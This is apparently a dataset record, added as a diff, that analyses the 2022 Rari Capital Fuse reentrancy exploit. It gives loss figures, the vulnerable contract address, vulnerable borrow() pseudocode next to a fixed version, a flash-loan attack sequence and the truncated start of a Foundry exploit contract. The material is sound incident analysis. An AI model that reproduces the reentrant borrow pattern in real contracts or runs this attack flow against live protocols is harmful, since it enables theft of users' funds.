@@ -1,0 +1,33 @@
+{
+ "id": "2022__2022-04-30_Rari_ERC20ReentrancyCompound",
+ "source_file": "2022/2022-04-30_Rari_ERC20ReentrancyCompound.md",
+ "title": "Rari Capital Fuse — ERC20 Reentrancy Over-Borrowing Against Collateral Analysis",
+ "date": "2022-04-30",
+ "protocol": "Rari Capital Fuse",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~$80,000,000 (ETH, USDC)",
+ "loss_usd": 80000000.0,
+ "root_cause": "A callback triggered during ETH transfer in the `borrow()` function of a Compound fork allows reentrancy, enabling additional borrowing before collateral state is updated",
+ "attack_tx": "Block 14,684,813",
+ "vulnerable_contract": "fETH_127 0x26267e41CeCa7C8E0f143554Af707336f27Fa051",
+ "classes": [
+  "reentrancy"
+ ],
+ "code_before": [
+  "❌ Vulnerable CEther(fETH).borrow() (Compound fork pseudocode)\ncontract CEther {\n    mapping(address => uint256) public borrowBalances;\n\n    function borrow(uint256 borrowAmount) external returns (uint256) {\n        // Collateral sufficiency check\n        uint256 allowed = comptroller.borrowAllowed(address(this), msg.sender, borrowAmount);\n        require(allowed == 0, \"borrow not allowed\");\n\n        //",
+  "❌ ETH transfer triggers fallback → reentrancy possible\n        // At this point, borrowBalances has not yet been updated\n        (bool success,) = msg.sender.call{value: borrowAmount}(\"\");\n        require(success, \"ETH transfer failed\");\n\n        //",
+  "❌ Borrow balance update occurs after ETH transfer\n        borrowBalances[msg.sender] += borrowAmount;\n\n        emit Borrow(msg.sender, borrowAmount, ...);\n        return NO_ERROR;\n    }\n}\n\n// Inside fallback:\n// comptroller.exitMarket(fUSDC) is called → USDC collateral removed\n// Already borrowed ETH is retained, collateral is released\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct pattern (CEI + nonReentrant)\ncontract CEtherFixed {\n    function borrow(uint256 borrowAmount) external nonReentrant returns (uint256) {\n        //",
+  "✅ Update state first (Effects)\n        borrowBalances[msg.sender] += borrowAmount;\n\n        uint256 allowed = comptroller.borrowAllowed(address(this), msg.sender, borrowAmount);\n        require(allowed == 0, \"borrow not allowed\");\n\n        //"
+ ],
+ "steps": [
+  "USDC.approve(fusdc_127) → fusdc_127.mint(150M USDC)",
+  "↓ ETH transfer → fallback executes"
+ ],
+ "other_code": [
+  "Attacker Contract (implements ETH fallback reentrancy)\n    │\n    ├─[1] Balancer flashLoan(150,000,000 USDC)\n    │\n    ├─[2] [Inside receiveFlashLoan]\n    │       │\n    │       ├─ fusdc_127.accrueInterest()\n    │       ├─ USDC.approve(fusdc_127) → fusdc_127.mint(150M USDC)\n    │       ├─ rari_Comptroller.enterMarkets([fusdc_127])\n    │       │       Register fUSDC as collateral\n    │       │\n    │       ├─ fETH_127.borrow(1,977 ETH)\n    │       │       ↓ ETH transfer → fallback executes\n    │       │           │\n    │       │           └─ [Reentrancy] rari_Comptroller.exitMarket(fusdc_127)\n    │       │                   USDC collateral removed!\n    │       │                   (possible because borrow balance not yet updated)\n    │       │\n    │       ├─ fusdc_127.redeemUnderlying(150M USDC",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IBalancerVault {\n    function flashLoan(\n        address recipient,\n        address[] memory tokens,\n        uint256[] memory amounts,\n        bytes memory userData\n    ) external;\n}\n\ninterface ICErc20 {\n    function mint(uint256 mintAmount) external returns (uint256);\n    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);\n    function accrueInterest() external returns (uint256);\n}\n\ninterface ICEther {\n    function borrow(uint256 borrowAmount) external returns (uint256);\n}\n\ninterface IComptroller {\n    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);\n    function exitMarket(address cToken) external returns (uint256);\n}\n\ncontr"
+ ]
+}
